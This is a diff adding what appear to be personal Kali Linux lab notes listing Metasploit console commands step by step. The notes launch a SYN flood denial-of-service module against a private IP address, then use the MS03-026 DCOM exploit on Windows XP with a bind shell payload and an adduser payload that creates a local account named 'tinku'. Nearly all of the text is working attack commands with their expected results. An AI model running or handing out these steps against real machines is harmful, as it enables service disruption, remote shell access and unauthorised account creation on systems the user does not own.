@@ -1,0 +1,34 @@
+syn-packet flooding- 
+in kali-
+
+msfconsole
+search synflood
+use auxiliary/dos/tcp/synflood
+show options
+set RHOSTS 192.168.1.251
+show options
+exploit
+
+
+On kali-
+
+msfconsole
+use exploit/windows/dcerpc/ms03_026_dcom
+show options
+set RHOSTS 192.168.8.144
+show options
+set payload <tab> <tab> 
+yes
+set payload windows/shell/bind_tcp
+show options
+exploit
+-> windows xp command promompt(shell) will open.
+
+
+Another payload->
+set payload windows/adduser
+show options
+set USER tinku
+exploit
+
+on windows xp- computer management->local users & group-> users-> refresh->  'Tinku'  name will appear.
